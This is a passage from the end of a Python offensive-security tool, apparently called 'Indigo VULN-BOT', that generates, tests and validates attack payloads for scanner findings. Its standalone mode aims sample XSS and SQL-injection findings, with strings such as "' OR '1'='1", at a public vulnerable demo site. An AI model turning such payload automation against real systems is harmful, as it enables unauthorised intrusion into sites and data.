            json.dump(data, f, indent=2, ensure_ascii=False, default=str)

        print(f"\n\033[32m[+] Results saved to: {filepath}\033[0m")
        return filepath


# ============================================================
# ENTRY POINT
# ============================================================
def run_vuln_bot(findings: List[Dict], config: Dict = None) -> List[Dict]:
    """
    Entry point untuk dipanggil dari indigo_scr.py.

    Args:
        findings: List of findings dari scanner
        config: Optional config override

    Returns:
        List of result dicts
    """
    print(f"\n\033[1;36m{'='*60}")
    print(f"  INDIGO VULN-BOT v3.0 - Multi-Layer AI Payload Engine")
    print(f"{'='*60}\033[0m\n")

    engine = VulnBotEngine(config)
    results = engine.process_multiple_findings(findings)
    engine.save_results(results)

    # Convert to dict for compatibility
    output = []
    for r in results:
        output.append({
            "finding": r.finding,
            "payloads_generated": r.payloads_generated,
            "payloads_tested": r.payloads_tested,
            "payloads_validated": r.payloads_validated,
            "best_payload": {
                "payload": r.best_payload.payload[:200] if r.best_payload else None,
                "complexity": r.best_payload.complexity.value if r.best_payload else None,
                "method": r.best_payload.complexity.value if r.best_payload else None,
                "context_score": r.best_response.confidence if r.best_response else 0.0,
            } if r.best_payload else {},
            "poc_files": r.poc_files,
        })

    return output


# ============================================================
# STANDALONE MODE
# ============================================================
if __name__ == "__main__":
    print("\n\033[36m" + "=" * 58)
    print("  Indigo VULN-BOT v3.0 - Standalone Mode")
    print("=" * 58 + "\033[0m\n")

    test_findings = [
        {
            "vuln_type": "xss",
            "name": "Cross Site Scripting (Reflected)",
            "severity": "High",
            "url": "http://testphp.vulnweb.com/search.php?test=query",
            "context": {"parameter": "test", "param_type": "url"},
            "evidence": "<script>alert",
            "technologies": ["php", "apache"],
            "waf_detected": False,
        },
        {
            "vuln_type": "sqli",
            "name": "SQL Injection",
            "severity": "High",
            "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
            "context": {"parameter": "cat", "param_type": "url"},
            "evidence": "' OR '1'='1",
            "technologies": ["mysql", "php"],
            "waf_detected": False,
        },
    ]

    results = run_vuln_bot(test_findings)

    print(f"\n\nGenerated {len(results)} result(s)")
    for r in results:
        print(f"\n  [{r['finding'].get('vuln_type', 'unknown').upper()}]")
        print(f"    Generated: {r['payloads_generated']} payloads")
        print(f"    Tested: {r['payloads_tested']} payloads")
        print(f"    Validated: {r['payloads_validated']} payloads")
